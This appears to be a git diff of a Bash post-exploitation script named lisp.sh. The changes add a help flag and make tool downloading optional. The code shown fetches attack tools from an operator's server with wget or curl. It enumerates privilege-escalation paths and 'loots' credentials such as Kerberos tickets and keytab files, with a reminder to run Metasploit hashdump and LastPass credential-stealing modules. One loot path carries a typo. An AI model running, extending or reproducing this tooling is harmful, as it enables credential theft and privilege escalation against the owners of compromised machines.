@@ -1,6 +1,6 @@
 #!/bin/bash
 ### CREATED BY KARMAZ
-while getopts "elu:" OPTION; do
+while getopts "elu:h" OPTION; do
     case $OPTION in
     e)
         escalation_on=1
@@ -10,41 +10,36 @@ while getopts "elu:" OPTION; do
         ;;
     u)
         server_url=$OPTARG
+        downloading_on=1
+        ;;
+    h)
+        echo "USAGE: 
+./lisp.sh -u http://127.0.0.1/  => DOWNLOADING
+./lisp.sh -e                    => PRIVILEGE ESCALATION
+sudo ./lisp.sh -l               => LOOTING"
+        exit 1
         ;;
     *)
-        echo "You must specify the server url flag.
-    USAGE: ./lisp.sh -e -l -u http://127.0.0.1/
-
-        # -e => PRIVILEGE ESCALATION
-        # -l => LOOTING
-        # -u => HOST WITH TOOLS"
+        echo "You must specify one of the flag.
+USAGE: 
+./lisp.sh -u http://127.0.0.1/  => DOWNLOADING
+./lisp.sh -e                    => PRIVILEGE ESCALATION
+sudo ./lisp.sh -l               => LOOTING"
         exit 1
         ;;
     esac
 done
-if [ -z "$server_url" ]
+if command -v wget &> /dev/null
 then
-echo "$server_url"
-echo "You must specify the server url flag.
-USAGE: ./lisp.sh -e -l -u http://127.0.0.1/
-            
-        # -e => PRIVILEGE ESCALATION
-        # -l => LOOTING
-        # -u => HOST WITH TOOLS"
-exit 1
+    wget_found=1
+elif command -v curl &> /dev/null
+then
+    curl_found=1
 else
-    if command -v wget &> /dev/null
-    then
-        wget_found=1
-    elif command -v curl &> /dev/null
-    then
-        curl_found=1
-    else
-        echo "Install wget | curl to make the script work."
-        exit 1
-    fi
-mkdir blood
+    echo "Install wget | curl to make the script work."
+    exit 1
 fi
+mkdir blood
 
 download_tools() {
     kernel_arch=$(uname -m)
@@ -126,6 +121,7 @@ looting() {
     klist | tee -a loot/kerberos.txt
     echo "======================= KERBEROS - KEYTABS" | tee -a loot/kerberos.txt
     find / -name "*.keytab" 2>/dev/null | tee -a lqoot/kerberos.txt
+    
     echo "======================= ADDITIONAL MSF MODULES - DO NOT FORGET:
 run post/linux/gather/hashdump
 run post/multi/gather/lastpass_creds
@@ -179,7 +175,11 @@ run post/linux/gather/enum_users_history
     ./pspy* | tee -a priv/pspy.txt
 }
 
-download_tools
+if [ $downloading_on == 1 ]
+then 
+    download_tools
+fi
+
 if [ $escalation_on == 1 ]
 then 
     escalation
